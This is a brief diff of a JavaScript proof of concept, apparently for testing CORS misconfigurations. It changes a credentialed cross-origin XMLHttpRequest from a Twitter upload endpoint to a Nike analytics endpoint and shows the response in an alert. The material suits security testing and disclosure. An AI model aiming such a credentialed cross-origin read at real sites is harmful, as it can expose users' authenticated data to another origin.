@@ -17,7 +17,7 @@ function cors() {
       document.getElementById("demo").innerHTML = alert(this.responseText);
     }
   };
-  xhttp.open("GET", "https://upload.twitter.com/i/media/upload.json?command=FINALIZE&media_id=1197454714125930496", true);
+  xhttp.open("GET", "https://analytics.nike.com/v1/batch", true);
   xhttp.withCredentials = true;
   xhttp.send();
 }
